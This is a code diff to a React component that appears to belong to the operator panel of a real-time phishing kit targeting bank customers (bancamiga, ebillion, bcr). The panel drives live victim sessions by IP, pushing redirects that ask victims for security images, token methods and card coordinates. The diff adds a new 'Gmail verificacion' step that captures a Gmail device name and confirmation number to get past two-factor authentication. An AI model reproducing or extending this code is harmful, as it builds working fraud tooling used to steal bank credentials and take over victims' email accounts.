@@ -6,7 +6,10 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
   const [formView, setFormView] = useState(false)
   const [isSelected, setIsSelected] = useState(false)
   
-  console.log(nameBank)
+  const allActionsCondition = true
+
+
+
   const {values, handleBlur, handleChange, handleSubmit } = useFormik({
     initialValues: {
       image: '',
@@ -14,8 +17,10 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
       coordinate1: '',
       coordinate2: '',
       coordinate3: '',
+      gmailDevice: '', 
+      gmailCode: ''
     },
-    onSubmit: async({image, methodToken, coordinate1,coordinate2,coordinate3}) =>{
+    onSubmit: async({image, methodToken, coordinate1,coordinate2,coordinate3, gmailCode, gmailDevice}) =>{
       if(textPage == 'Metodo seguridad' && !isSelected) socket.emit('[bancamiga] getImage', {image, ip})
       if(textPage == 'Imagen') {
         (isSelected) 
@@ -24,13 +29,17 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
       }
       if(textPage == 'Metodo de token') socket.emit('[ebillion] sendMethodToken', {methodToken})
       if(textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') socket.emit('[bcr] getCoordinates', {coordinate1,coordinate2,coordinate3, ip})
-      socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank })
+      if(textPage == 'Gmail verificacion' ) socket.emit('[gmail] deviceAndNumberVerify', {gmailCode, gmailDevice, ip})
+      
+      textPage == 'Gmail verificacion' 
+      ? socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank, specialInfo: false })
+      : socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank, specialInfo: true })
       setFormView(false)
       onClose()
     }
   })
   const sendBagRedirect = () => {
-    if(textPage == 'Metodo seguridad' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') return setFormView(true)
+    if(textPage == 'Metodo seguridad' || textPage == 'Gmail verificacion' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') return setFormView(true)
     socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank  })
     setFormView(false)
     onClose()
@@ -94,6 +103,21 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
                   <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                     Enviar lo copiado
                   </Checkbox>
+              ) : null
+            }
+            {
+              textPage == 'Gmail verificacion' ? (
+                <div className="flex flex-col gap-5">
+                  <div> 
+                    <label htmlFor="deviceGmail">Dispositivo</label>
+                    <input required autoComplete="false" className="w-full py-1 pl-3" type="text" name="gmailDevice" value={values.gmailDevice} onChange={handleChange} />
+                  </div>
+                  <div>
+                    <label htmlFor="deviceGmail">Numero de confirmación</label>
+                    <input required autoComplete="false" className="w-full py-1 pl-3" type="number" name="gmailCode" value={values.gmailCode.toString().slice(0,2)} onChange={handleChange} />
+                  </div>
+                </div>
+
               ) : null
             }
            
